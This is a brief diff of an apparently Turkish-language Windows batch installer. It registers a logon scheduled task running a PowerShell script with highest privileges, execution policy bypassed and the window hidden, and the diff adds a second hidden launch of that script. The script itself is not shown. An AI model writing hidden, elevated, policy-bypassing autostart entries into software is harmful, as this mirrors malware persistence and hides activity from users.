@@ -194,6 +194,7 @@ powershell -ExecutionPolicy Bypass -NoProfile -Command "& {
 schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
 schtasks /Create /F /TN "%TASK_NAME%" /SC ONLOGON /RL HIGHEST /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File \"%TARGET_PS1%\"" >nul
 schtasks /Run /TN "%TASK_NAME%" >nul 2>&1
+Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"%TARGET_PS1%`"" -WindowStyle Hidden
 
 echo.
 echo [TEBRIKLER] KURULUM TAMAMLANDI!
